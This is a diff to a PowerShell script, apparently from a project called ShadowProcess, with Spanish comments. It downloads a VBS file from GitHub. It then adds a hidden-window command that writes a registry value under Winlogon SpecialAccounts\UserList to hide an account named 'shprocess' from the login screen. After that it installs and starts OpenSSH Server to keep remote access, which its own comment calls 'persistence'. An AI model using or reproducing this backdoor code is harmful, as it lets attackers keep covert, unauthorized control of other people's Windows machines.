@@ -50,9 +50,10 @@ $vbs_file = random_text
 Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/confirm.vbs -OutFile "$vbs_file.vbs"
 
 #instalando registro
-powershell .\"$reg_file.reg";powershell .\"$vbs_file.vbs"
+#powershell .\"$reg_file.reg";powershell .\"$vbs_file.vbs"
+powershell powershell.exe -windowstyle hidden Set-Location -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList';Get-Item -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList' | New-Item -Name 'shprocess' -Force;New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Name 'shprocess' -Value "00000000" -PropertyType DWORD -Force
 
-
+cd $path
 # estableciendo persistencia ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd 
